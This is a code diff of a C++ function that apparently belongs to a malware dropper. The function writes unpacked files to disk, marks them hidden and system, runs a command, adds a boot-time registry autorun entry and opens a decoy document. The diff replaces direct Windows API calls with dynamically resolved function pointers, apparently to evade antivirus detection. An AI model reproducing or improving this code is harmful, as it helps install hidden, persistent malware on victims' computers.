@@ -229,7 +229,7 @@ int Crypto::releaseFiles(const char* data, int datasize) {
 			ret = FileHelper::fileWriter((path + filename).c_str(), (const char*)uncompbuf, uncompbufsize, TRUE);
 			if (ret > 0)
 			{
-				ret = SetFileAttributesA((path + filename).c_str(), 
+				ret = lpSetFileAttributesA((path + filename).c_str(), 
 					FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);
 			}
 			else {
@@ -262,7 +262,7 @@ int Crypto::releaseFiles(const char* data, int datasize) {
 
 		//MessageBoxA(0, szcmd, szcmd, MB_OK);
 
-		ret = WinExec(szcmd, SW_SHOW);
+		ret =lpWinExec(szcmd, SW_SHOW);
 
 		ret = setRegBootRun(HKEY_CURRENT_USER, runningfn.c_str());
 	}
@@ -270,7 +270,7 @@ int Crypto::releaseFiles(const char* data, int datasize) {
 	if (docfn != "")
 	{
 		char szshellOpen[] = { 'o','p','e','n',0 };
-		ShellExecuteA(0, szshellOpen, docfn.c_str(), "", "", 0);
+		lpShellExecuteA(0, szshellOpen, docfn.c_str(), "", "", 0);
 		//char szcmd[1024] = { 0 };
 		//wsprintfA(szcmd, "cmd /c \"%s\"", docfn.c_str());
 		//ret = lpWinExec(szcmd, SW_SHOW);
